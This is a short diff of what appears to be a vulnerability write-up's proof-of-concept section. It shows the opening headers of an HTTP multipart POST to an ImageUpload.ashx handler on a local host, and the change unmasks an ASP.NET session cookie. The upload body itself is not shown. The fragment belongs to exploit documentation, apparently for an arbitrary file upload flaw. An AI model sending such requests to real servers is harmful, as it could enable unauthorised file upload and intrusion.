@@ -79,7 +79,7 @@ POC/EXP：
 ```http
 POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
 Host: 127.0.0.1
-Cookie: ASP.NET_SessionId=r**********************5
+Cookie: ASP.NET_SessionId=rv4lsx3uf0oec2yy1n5
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
